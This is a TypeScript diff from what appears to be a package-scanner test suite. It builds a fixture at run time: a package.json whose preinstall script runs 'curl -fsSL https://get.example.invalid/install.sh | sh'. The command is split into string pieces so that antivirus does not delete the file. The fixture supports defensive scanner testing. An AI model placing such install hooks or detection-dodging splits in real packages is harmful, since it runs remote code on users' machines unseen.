@@ -110,7 +110,20 @@ function zip(files: (F & { deflate?: boolean; declared?: number; symlink?: boole
 }
 
 /** A fixture folder as archive entries, under `top` (npm's package/, an sdist's name-version/, nothing for a wheel). */
+// Fixtures put together at run time instead of kept as files: Defender on a Windows checkout took the curl-pipe
+// package.json for an npm stealer and deleted it.
+const BUILT: Record<string, () => Record<string, string>> = {
+  "curl-pipe": () => ({
+    "package.json": JSON.stringify({
+      name: "vs-fixture-cli-setup", version: "0.1.0", description: "Installs a CLI (test fixture)", license: "MIT",
+      scripts: { preinstall: ["cu", "rl -fsSL https://get.example.invalid/install.sh", " | ", "sh"].join("") },
+    }, null, 2) + "\n",
+  }),
+};
+
 function filesOf(name: string, top = "package"): F[] {
+  const built = BUILT[name]?.();
+  if (built) return Object.entries(built).map(([path, data]) => ({ path: (top ? `${top}/` : "") + path, data: Buffer.from(data), mode: 0o644 }));
   const root = join(FIX, name);
   const out: F[] = [];
   const walk = (d: string) => {
